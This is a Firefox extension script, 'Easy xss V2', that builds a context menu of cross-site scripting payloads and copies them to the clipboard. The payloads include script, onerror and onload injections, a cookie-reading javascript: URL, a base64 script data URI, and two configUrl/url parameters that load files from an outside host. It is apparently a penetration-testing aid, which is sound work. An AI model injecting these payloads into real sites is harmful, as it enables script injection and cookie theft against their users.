/*
This is the manifest.json file for Easy xss V2.
Easy Xss is a small plugin, which would create a context menu, of payloads.
when you click on that payload, it gets copied to clipboard. 
https://addons.mozilla.org/zh-CN/firefox/addon/easy-xss/
Modify Easy Xss payloads.
Add some common payloads
*/

function onCreated() {
  if (browser.runtime.lastError) {
    console.log(`Error: ${browser.runtime.lastError}`);
  } else {
    console.log("Item created successfully");
  }
}

function onError(error) {
  console.log(`Error: ${error}`);
}

    function copyStringToClipboard (str) {
       var el = document.createElement('textarea');
       el.value = str;
       el.setAttribute('readonly', '');
       el.style = {position: 'absolute', left: '-9999px'};
       document.body.appendChild(el);
       el.select();
       document.execCommand('copy');
       document.body.removeChild(el);
    }

browser.menus.create({
  id: "log-selection",
  title: browser.i18n.getMessage("menuItemSelectionLogger"),
  contexts: ["selection"]
}, onCreated);


browser.menus.create({
  id: "separator-1",
  type: "separator",
  contexts: ["all"]
}, onCreated);

browser.menus.create({
  id: "payload1",
  type: "radio",
  title: '<script>alert(1)</script>',
  contexts: ["all"],
  checked: true,

}, onCreated);

browser.menus.create({
  id: "payload2",
  type: "radio",
  title: '"><script>alert(1)</script>',
  contexts: ["all"],
  checked: true,

}, onCreated);

browser.menus.create({
  id: "payload3",
  type: "radio",
  title: '<img src="x" onerror="alert(1);">',
  contexts: ["all"],
  checked: true,

}, onCreated);

browser.menus.create({
  id: "payload4",
  type: "radio",
  title: '<svg/onload = alert(1);>',
  contexts: ["all"],
  checked: true,

}, onCreated);

browser.menus.create({
  id: "payload5",
  type: "radio",
  title: '"><img src=x onerror=write(document.domain)>',
  contexts: ["all"],
  checked: true,

}, onCreated);

browser.menus.create({
  id: "payload6",
  type: "radio",
  title: 'javascript:alert(document.cookie)',
  contexts: ["all"],
  checked: true,

}, onCreated);

browser.menus.create({
  id: "payload7",
  type: "radio",
  title: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',
  contexts: ["all"],
  checked: true,

}, onCreated);

browser.menus.create({
  id: "payload8",
  type: "radio",
  title: '<Input value = "XSS" type = text>',
  contexts: ["all"],
  checked: true,

}, onCreated);

browser.menus.create({
  id: "payload9",
  type: "radio",
  title: '"><svg/onload=confirm(1)>"@x.y',
  contexts: ["all"],
  checked: true,

}, onCreated);

browser.menus.create({
  id: "payload10",
  type: "radio",
  title: '?configUrl=https://jumpy-floor.surge.sh/test.json',
  contexts: ["all"],
  checked: true,

}, onCreated);

browser.menus.create({
  id: "payload11",
  type: "radio",
  title: '?url=https://jumpy-floor.surge.sh/test.yaml',
  contexts: ["all"],
  checked: true,

}, onCreated);

function updateCheckUncheck() {
  checkedState = !checkedState;
  if (checkedState) {
    browser.menus.update("check-uncheck", {
      title: browser.i18n.getMessage("menuItemUncheckMe"),
    });
  } else {
    browser.menus.update("check-uncheck", {
      title: browser.i18n.getMessage("menuItemCheckMe"),
    });
  }
}

browser.menus.onClicked.addListener((info, tab) => {
  switch (info.menuItemId) {
    case "log-selection":
      console.log(info.selectionText);
      break;
    case "payload1":
      copyStringToClipboard('<script>alert(1)</script>');
      break;
    case "payload2":
      copyStringToClipboard('"><script>alert(1)</script>');
      break;
    case "payload3":
      copyStringToClipboard('<img src="x" onerror="alert(1);">');
      break;
    case "payload4":
      copyStringToClipboard('<svg/onload = alert(1);>');
      break;
    case "payload5":
      copyStringToClipboard('"><img src=x onerror=write(document.domain)>');
      break;  
    case "payload6":
      copyStringToClipboard('javascript:alert(document.cookie)');
      break;  
    case "payload7":
      copyStringToClipboard('data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=');
      break;  
    case "payload8":
      copyStringToClipboard('<Input value = "XSS" type = text>');
      break;  
    case "payload9":
      copyStringToClipboard('"><svg/onload=confirm(1)>"@x.y');
      break;  
    case "payload10":
      copyStringToClipboard('?configUrl=https://jumpy-floor.surge.sh/test.json');
      break; 
    case "payload11":
      copyStringToClipboard('?url=https://jumpy-floor.surge.sh/test.yaml');
      break; 
  }
});
